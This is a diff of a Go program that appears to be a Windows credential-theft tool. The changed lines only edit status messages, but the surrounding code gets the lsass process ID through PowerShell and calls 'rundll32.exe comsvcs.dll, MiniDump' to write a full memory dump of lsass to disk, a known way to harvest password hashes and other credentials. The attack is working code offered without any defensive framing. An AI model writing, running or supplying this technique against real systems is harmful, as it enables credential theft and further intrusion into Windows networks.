@@ -1,8 +1,8 @@
 package main
 
 import (
-	"flag"
 	"fmt"
+	"flag"
 	"os"
 	"os/exec"
 	"syscall"
@@ -32,11 +32,12 @@ func dump(path string) {
 		fmt.Println("You have to be admin...")
 		return
 	} else {
-		fmt.Println("[+] Get process id")
+		fmt.Println("[-] Get lsass process id")
 		//Get lsass process pid
 		cmd := exec.Command("powershell", "/C", "(Get-Process -Name lsass).Id")
 		pid, _ := cmd.Output()
-		fmt.Print("[+] Dump process " + string(pid))
+		fmt.Println("[+] Lsass pid : "+string(pid))
+		fmt.Print("[-] Dump process")
 		//dump the process with rundll32
 		argv, _ := syscall.UTF16PtrFromString("rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump " + string(pid) + " " + pathFile + " full")
 		err := syscall.CreateProcess(
